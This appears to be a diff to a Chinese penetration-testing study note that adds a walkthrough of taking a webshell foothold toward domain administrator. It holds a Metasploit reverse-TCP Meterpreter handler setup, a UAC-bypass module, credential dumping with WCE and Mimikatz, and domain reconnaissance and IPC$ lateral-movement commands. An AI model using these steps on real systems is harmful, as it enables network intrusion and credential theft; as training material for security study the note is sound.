@@ -1,8 +1,8 @@
-Web安全攻防
+# Web安全攻防
 
 ## 渗透测试之信息收集
 
-
+`chcp 65001`
 
 ### 收集字段&对应工具
 
@@ -3813,7 +3813,7 @@ QuarksPwDump_v0.3b.exe -o xxx.txt
 
 **Windows Credentials Editor（WCE）**是一款强大的Windows平台内网渗透工具，渗透工具，它能列举登录会话，并且可以添加、改变和删除相关凭据（例如LM/NT Hash)。这些功能在内网渗透中能够被利用，例如，在Windows平台上执行绕过Hash操作或者从内存中获取NT/LM Hash(也可以从交互式登录、服务、远程桌面连接中获取）以用于进一步的攻击，而且体积也非常小，是内网渗透时的必备工具。不过必须在管理员权限下使用，注意免杀。
 
-首先输入upload命令将wce.exe上传到目标主机C盘中，然后在目标机Shell下输入`wce -w`命令，便会成功提取系统明文管理员的密码
+**首先输入upload命令将wce.exe上传到目标主机C盘中**，然后在目标机Shell下输入`wce -w`命令，便会成功提取系统明文管理员的密码
 
 ```
 wce -w
@@ -3844,7 +3844,7 @@ wce -w
 
 Mimikatz是一款后渗适测试工具，可以轻松抓取系统密码，此外还包括能够通过获取的Kerberos登录凭据，绕过支持RestrictedAdmin模式下Windows8或Windows Server2012的远程终端(RDP)等功能。需要注意该工具在Windows2000与Windows XP系统下无法使用！
 
-**Mimikatz必须在管理员权限下使用**，此时假设我们通过一系列前期渗透，已经成功获得目标机的Meterpreter Shell，当前权限为Administrator,输入 `getsystem` 命令获取了系统权限
+**Mimikatz必须在管理员权限下使用**，此时假设我们通过一系列前期渗透，已经成功获得目标机的Meterpreter Shell，当前权限为Administrator，输入 `getsystem` 命令获取了系统权限
 
 ```
 getsystem
@@ -4288,6 +4288,7 @@ msf5 exploit(multi/script/web_delivery) > exploit -j -z
 
 ```
 use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 攻击机IP
 set LPORT 攻击机端口
 run
@@ -4352,6 +4353,101 @@ run
 ![image-20210322220244488](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210322220244488.png)
 
 我们的渗透目标是通过一个普通的Webshell权限一步步地获得域管权限，从而掌控整个内网
+
+
+
+#### 渗透思路
+
+<img src="https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323101934871.png" alt="image-20210323101934871" style="zoom:150%;" />
+
+
+
+#### 提升权限
+
+我们拿到Meterpreter Shell后要做的第一件事情就是**提权**。通常，在渗透过程中我们只是获得了一个系统的Guest或User权限。低权限会使我们的渗透受到很多的限制。所以必须将访问权限最后提升到SYSTEM
+
+此时，我们获得的只是一个普通域用户的权限
+
+![image-20210323093347868](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323093347868.png)
+
+接下来利用漏洞提权
+
+- 本地溢出漏洞（MS1505，MS15078）失败
+
+  ![image-20210323094131053](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323094131053.png)
+
+  - 绕过Windows账户控制（UAC），我们利用Bypass UAC进行提权最后失败，如果成功会返回一个新的Meterpreter Shell
+
+  ```
+  use exploit/windows/local/bypassuac
+  ```
+
+  ![image-20210323094647684](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210323094647684.png)
+
+  **使用Bypass UAC模块进行提权时，系统当前用户必须在管理员组**，而且**用户账户控制程序UAC设置为默认**，即“仅在程序试图更改我的计算机时通知我”，而且Bypass UAC模块运行时会因为在目标机上创建多个文件而被杀毒软件识别。我们没能绕过UAC，可能是这两个原因
+
+
+
+#### 信息收集
+
+虽然此时提权不成功，但是还是可以进行域渗透测试的信息收集。
+
+**通过收集以下的信息，我们可以分析出内网是怎么划分的，各机器名的命名规则，根据机器名尝试找出重要人物的计算机，以及目标机是否为多层域结构，关键是要探测出域管理员的名字和域服务器的名字等信息**
+
+收集字段
+
+- IP地址
+- 域主机数：`net view`
+
+| 命令                                   | 作用                 |
+| -------------------------------------- | -------------------- |
+| net user/domain                        | 查看域用户           |
+| net view/domain                        | 查看有几个域         |
+| net view/domain:XXX                    | 查看XXX域内的主机    |
+| **net group/domain**                   | 查看域里面的组       |
+| net group "domain computers" /domain   | 查看域内所有的主机名 |
+| **net group "domain admins" /domain**  | 查看域管理员         |
+| net group "domain controllers" /domain | 查看域控制器         |
+| net group "enterprise admins" /domain  | 查看企业管理组       |
+| nettime/ domain                        | 查看时间服务器       |
+
+
+
+#### 获取一台服务器的权限
+
+当我们**无法提权**导致不可以直接攻击域服务器时，可以
+
+- 使用Meterpreter目前拥有的权限添加内网路由，进行弱口令扫描
+- 使用PowerShell对内网进行扫描（要求目标机是 Windows7以上的服务器）
+- 架设Socks4a，然后Socks会自动进行内网扫描
+- 利用当前权限进行内网IPC$渗透
+- 其他方法
+
+
+
+我们先选择最简单的方法——”利用当前权限进行内网IPC$渗透“，输入`net view` 命令查看域主机，在列举的机器名里选择一个和我们机器名相似的服务器来试试，不出意外的话，成功率很高
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
